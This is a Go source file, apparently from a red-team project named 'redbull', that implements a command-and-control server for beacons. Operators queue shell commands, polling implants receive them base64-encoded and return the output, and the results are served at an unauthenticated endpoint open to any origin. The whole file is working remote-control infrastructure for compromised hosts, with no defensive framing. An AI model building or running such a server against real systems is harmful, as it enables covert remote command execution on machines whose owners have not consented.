package main

import (
	"encoding/base64"
	"net/http"
	"redbull/internal/rbhttp"
	"redbull/internal/rbqueue"
	"strings"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
	"github.com/go-chi/cors"
	"github.com/go-chi/render"
	"go.uber.org/zap"
)

var cmdQueue = rbqueue.NewQueue[string]()

 var responses = rbhttp.NewBeaconResponses()

func init() {
	logger := zap.Must(zap.NewDevelopment())
	zap.ReplaceGlobals(logger)
}

func errorResponse(w http.ResponseWriter, r *http.Request, status int, msg string) {
	render.Status(r, status)
	render.PlainText(w, r, msg)
}

func checkIn(w http.ResponseWriter, r *http.Request) {
	cmdQueue.Lock()
	defer cmdQueue.Unlock()

	zap.L().Debug("queue", zap.Int("queue", cmdQueue.Len()), zap.Bool("empty", cmdQueue.IsEmpty()))
	if cmdQueue.IsEmpty() {
		render.Status(r, 204)
		render.NoContent(w, r)
		return
	}

	command, _ := cmdQueue.Pop()
	encodedCmd := base64.StdEncoding.EncodeToString([]byte(command))
	render.PlainText(w, r, encodedCmd)
}

func response(w http.ResponseWriter, r *http.Request) {
	responseData, err := rbhttp.ReadPlaintextBody(r)
	if err != nil {
		zap.L().Error("response - read body", zap.Error(err))
		errorResponse(w, r, 400, "invalid response format")
		return
	}

	groups := strings.Split(responseData, "\n\n")

	command := groups[0]
	stdout := groups[1]
	stderr := groups[2]

	responses.Append(*rbhttp.NewBeaconResponse(command, stdout, stderr))
	render.Status(r, 204)
	render.NoContent(w, r)
}

func newCommand(w http.ResponseWriter, r *http.Request) {
	command, err := rbhttp.ReadPlaintextBody(r)
	if err != nil {
		zap.L().Error("newCommand - decode", zap.Error(err))
		errorResponse(w, r, 400, "invalid command")
		return
	}

	cmdQueue.Lock()
	defer cmdQueue.Unlock()
	cmdQueue.Append(command)
	render.Status(r, 200)
	render.PlainText(w, r, "queued")
}

func fetchResponses(w http.ResponseWriter, r *http.Request) {
	render.JSON(w, r, responses.Responses)
}

func main() {
	r := chi.NewRouter()
	r.Use(middleware.Logger)
	r.Use(middleware.RequestID)
	r.Use(middleware.RealIP)
	r.Use(middleware.Recoverer)
	r.Use(middleware.URLFormat)
	r.Use(cors.Handler(cors.Options{
		// AllowedOrigins:   []string{"https://foo.com"}, // Use this to allow specific origin hosts
		AllowedOrigins: []string{"https://*", "http://*"},
		// AllowOriginFunc:  func(r *http.Request, origin string) bool { return true },
		AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowedHeaders:   []string{"Accept", "Authorization", "Content-Type", "X-CSRF-Token", "x-auth-token"},
		ExposedHeaders:   []string{"Link"},
		AllowCredentials: false,
		MaxAge:           300, // Maximum value not ignored by any of major browsers
	}))

	r.Get("/", checkIn)
	r.Post("/", response)
	r.Post("/command", newCommand)
	r.Get("/responses", fetchResponses)

	zap.L().Info("Running on 0.0.0.0:8000")
	http.ListenAndServe(":8000", r)
}
